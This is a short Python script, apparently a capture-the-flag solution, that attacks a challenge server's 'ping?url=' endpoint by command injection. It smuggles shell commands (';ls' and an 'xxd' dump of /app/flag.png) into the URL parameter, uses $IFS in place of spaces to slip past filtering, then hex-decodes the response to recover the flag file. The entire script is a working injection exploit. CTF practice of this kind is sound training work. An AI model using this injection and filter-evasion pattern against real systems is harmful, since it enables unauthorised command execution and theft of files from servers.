import requests as req
import base64
from binascii import hexlify, unhexlify

url = "https://challenges.isictf.live:1416//ping?url="
command1="https://github.com/;ls"
command2="https://github.com/;xxd$IFS-p$IFS/app/flag.png"

resp = req.get(url+command2)
decoded_bytes=unhexlify(resp.text.replace("\n",""))
f = 'image2.png'  
with open(f, 'wb') as file:
    file.write(decoded_bytes)
